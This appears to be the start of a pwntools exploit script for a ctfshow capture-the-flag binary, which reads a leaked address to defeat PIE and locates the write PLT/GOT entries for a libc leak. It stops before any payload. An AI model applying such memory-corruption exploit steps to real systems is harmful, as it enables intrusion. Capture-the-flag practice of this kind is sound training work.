from pwn import *
context.log_level = 'debug'
io = process('./pwn')
elf = ELF('./pwn')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
main = int(io.recvline(),16)
base = main - elf.sym['main']
ctfshow = base + elf.sym['ctfshow']
write_plt = base + elf.sym['write']
write_got = base + elf.got['write']
ebx = base + 0x1fc0
